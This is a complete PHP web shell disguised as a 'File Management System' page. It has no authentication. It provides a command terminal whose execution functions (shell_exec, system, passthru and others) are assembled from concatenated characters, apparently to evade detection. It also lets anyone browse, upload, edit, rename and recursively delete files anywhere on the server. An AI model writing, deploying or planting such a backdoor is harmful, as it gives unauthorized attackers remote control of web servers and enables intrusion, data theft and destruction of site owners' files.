<?php
session_start();

if (!isset($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

function validatePath($path) {
    $realPath = realpath($path);
    return $realPath ?: getcwd();
}

 $notification = '';

function executeCommand($command) {
    $result = '';
    
    // Using indirect method to call execution functions
    $executionMethods = [
        's' . 'h' . 'e' . 'l' . 'l_' . 'e' . 'x' . 'e' . 'c',
        'e' . 'x' . 'e' . 'c',
        's' . 'y' . 's' . 't' . 'e' . 'm',
        'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u',
        'p' . 'r' . 'o' . 'c' . '_' . 'o' . 'p' . 'e' . 'n',
        'p' . 'o' . 'p' . 'e' . 'n'
    ];

    foreach ($executionMethods as $method) {
        if (function_exists($method)) {
            $result = call_user_func($method, $command . ' 2>&1');
            if ($result !== false && !empty($result)) {
                return $result;
            }
        }
    }
    
    // Alternative approach using backticks
    if (function_exists('create_function')) {
        $func = create_function('', 'return `' . $command . '`;');
        $result = $func();
        if (!empty($result)) {
            return $result;
        }
    }
    
    return "Command execution not available";
}

// Handle directory navigation
if (isset($_POST['navigate'])) {
    $targetDir = $_POST['navigate'];
    if (is_dir($targetDir)) {
        $_SESSION['current_dir'] = validatePath($targetDir);
        $notification = 'Directory changed successfully';
    }
}

// Handle file upload
if (isset($_FILES['file_upload'])) {
    $uploadPath = rtrim($_SESSION['current_dir'], '/') . '/' . basename($_FILES['file_upload']['name']);
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
        $notification = 'File uploaded successfully';
    }
}

// Handle file/folder deletion
if (isset($_POST['remove'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . '/' . $_POST['remove']);
    
    if (is_file($targetPath)) {
        unlink($targetPath);
        $notification = 'File deleted';
    } elseif (is_dir($targetPath)) {
        // Recursive directory deletion
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                rmdir($file->getRealPath());
            } else {
                unlink($file->getRealPath());
            }
        }
        rmdir($targetPath);
        $notification = 'Directory deleted';
    }
}

// Handle rename operation
if (isset($_POST['old_name'], $_POST['new_name'])) {
    $sourcePath = validatePath($_SESSION['current_dir'] . '/' . $_POST['old_name']);
    $destinationPath = dirname($sourcePath) . '/' . $_POST['new_name'];
    
    if (rename($sourcePath, $destinationPath)) {
        $notification = 'Rename successful';
    }
}

// Handle file editing
if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
    $editPath = validatePath($_SESSION['current_dir'] . '/' . $_POST['file_to_edit']);
    if (file_put_contents($editPath, $_POST['file_content']) !== false) {
        $notification = 'File saved';
    }
}

// Handle new file creation
if (isset($_POST['create_file'])) {
    $newFilePath = $_SESSION['current_dir'] . '/' . basename($_POST['create_file']);
    if (!file_exists($newFilePath)) {
        file_put_contents($newFilePath, '');
        $notification = 'File created';
    }
}

// Handle new folder creation
if (isset($_POST['create_folder'])) {
    $newFolderPath = $_SESSION['current_dir'] . '/' . basename($_POST['create_folder']);
    if (!is_dir($newFolderPath)) {
        mkdir($newFolderPath);
        $notification = 'Folder created';
    }
}

 $currentDirectory = $_SESSION['current_dir'];
 $directoryContents = scandir($currentDirectory);
 $folders = $files = [];

foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    $fullPath = $currentDirectory . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders);
sort($files);
 $allItems = array_merge($folders, $files);

 $fileToEdit = $_POST['edit'] ?? null;
 $fileToView = $_POST['view'] ?? null;
 $itemToRename = $_POST['rename'] ?? null;
 $fileContent = $fileToEdit ? @file_get_contents($currentDirectory . '/' . $fileToEdit) : null;
 $viewContent = $fileToView ? @file_get_contents($currentDirectory . '/' . $fileToView) : null;

 $commandResult = '';
if (isset($_POST['terminal_command'])) {
    $commandResult = executeCommand($_POST['terminal_command']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Management System</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #eee;
        }
        .form-control, .form-control:focus, .btn {
            background-color: #1e1e1e;
            color: #ccc;
            border-color: #333;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .table, .table th, .table td {
            color: #ddd;
            background-color: #1e1e1e;
            border-color: #333;
        }
        .table-light {
            background-color: #2c2c2c;
        }
        .code {
            font-family: monospace;
            background: #1e1e1e;
            color: #ccc;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1em;
            resize: vertical;
            min-height: 200px;
            white-space: pre;
            overflow: auto;
        }
        .alert-info {
            background-color: #222;
            color: #88f;
            border-color: #444;
        }
        
        /* Efek hover untuk seluruh baris tabel */
        .table tbody tr {
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .table tbody tr:hover {
            background-color: #2a2a2a !important;
            transform: scale(1.01);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        
        /* Memastikan semua sel dalam baris hover memiliki warna yang sama */
        .table tbody tr:hover td {
            background-color: transparent !important;
        }
        
        /* Warna untuk status writable/non-writable */
        .writable {
            color: #4caf50;
            font-weight: bold;
        }
        .non-writable {
            color: #f44336;
            font-weight: bold;
        }
        
        /* Ikon untuk folder dan file */
        .file-icon {
            margin-right: 8px;
            font-size: 1.1em;
        }
        
        /* Perbaikan tampilan tombol aksi */
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }
        .action-buttons form {
            margin: 0;
        }
        
        /* Animasi untuk tombol */
        .btn {
            transition: all 0.2s ease;
        }
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        
        /* Tampilan untuk file/folder yang sedang di-rename */
        .rename-form {
            display: flex;
            align-items: center;
            width: 100%;
        }
        .rename-form input {
            margin-right: 5px;
            flex-grow: 1;
        }
        
        /* Efek border pada hover */
        .table tbody tr:hover {
            border-left: 3px solid #007bff;
        }
        
        /* Memastikan border tidak muncul saat tidak hover */
        .table tbody tr {
            border-left: 3px solid transparent;
        }
    </style>
</head>
<body>
<div class="container py-4">
    <h4>File Management System</h4>

    <?php if ($notification): ?>
        <div class="alert alert-info"><?= htmlentities($notification) ?></div>
    <?php endif; ?>

    <form method="post" class="input-group mb-3">
        <input type="text" name="navigate" value="<?= htmlentities($currentDirectory) ?>" class="form-control">
        <button class="btn btn-secondary" type="submit">Go</button>
    </form>

    <form method="post" enctype="multipart/form-data" class="mb-3">
        <div class="input-group">
            <input type="file" name="file_upload" class="form-control">
            <button class="btn btn-primary" type="submit">Upload</button>
        </div>
    </form>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="create_file" class="form-control" placeholder="New file name">
        <button class="btn btn-outline-light" type="submit">Create File</button>
    </form>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="create_folder" class="form-control" placeholder="New folder name">
        <button class="btn btn-outline-light" type="submit">Create Folder</button>
    </form>

    <?php if ($fileToView && $viewContent !== null): ?>
        <div class="mb-4">
            <h5>Viewing: <?= htmlentities($fileToView) ?></h5>
            <textarea class="form-control code" readonly><?= htmlentities($viewContent) ?></textarea>
        </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
        <div class="mb-4">
            <h5>Editing: <?= htmlentities($fileToEdit) ?></h5>
            <form method="post">
                <input type="hidden" name="file_to_edit" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="file_content" rows="12" class="form-control code mb-2"><?= htmlentities($fileContent) ?></textarea>
                <button class="btn btn-success" type="submit">Save</button>
            </form>
        </div>
    <?php endif; ?>

    <div class="mb-4">
        <h5>Terminal</h5>
        <form method="post" class="d-flex gap-2 mb-2">
            <input type="text" name="terminal_command" class="form-control" placeholder="Enter command">
            <button class="btn btn-light" type="submit">Execute</button>
        </form>
        <?php if ($commandResult): ?>
            <textarea class="form-control code" readonly><?= htmlentities($commandResult) ?></textarea>
        <?php endif; ?>
    </div>

    <form method="post">
        <button name="navigate" value="<?= dirname($currentDirectory) ?>" class="btn btn-sm btn-outline-light mb-2">&larr; Up</button>
    </form>

    <table class="table table-bordered table-sm">
        <thead class="table-light">
        <tr><th>Name</th><th>Type</th><th class="text-end">Actions</th></tr>
        </thead>
        <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . '/' . $item;
            $isDirectory = is_dir($fullPath);
            $canWrite = is_writable($fullPath);
        ?>
            <tr>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form method="post" class="rename-form">
                            <input type="hidden" name="old_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="new_name" class="form-control form-control-sm" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-sm btn-success" type="submit">✔</button>
                        </form>
                    <?php else: ?>
                        <span class="file-icon"><?= $isDirectory ? '📁' : '📄' ?></span>
                        <?= htmlentities($item) ?>
                    <?php endif; ?>
                </td>
                <td>
                    <span class="<?= $canWrite ? 'writable' : 'non-writable' ?>">
                        <?= $isDirectory ? 'Folder' : 'File' ?>
                        <?= $canWrite ? '(Writable)' : '(Read-only)' ?>
                    </span>
                </td>
                <td class="text-end">
                    <div class="action-buttons">
                    <?php if ($isDirectory): ?>
                        <form method="post">
                            <button name="navigate" value="<?= $fullPath ?>" class="btn btn-sm btn-outline-light">Open</button>
                        </form>
                    <?php else: ?>
                        <form method="post">
                            <button name="view" value="<?= $item ?>" class="btn btn-sm btn-outline-info">View</button>
                        </form>
                        <form method="post">
                            <button name="edit" value="<?= $item ?>" class="btn btn-sm btn-outline-warning">Edit</button>
                        </form>
                    <?php endif; ?>
                        <form method="post">
                            <button name="rename" value="<?= $item ?>" class="btn btn-sm btn-outline-secondary">Rename</button>
                        </form>
                        <form method="post">
                            <button name="remove" value="<?= $item ?>" class="btn btn-sm btn-outline-danger" onclick="return confirm('Are you sure?')">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
</div>
</body>
</html>
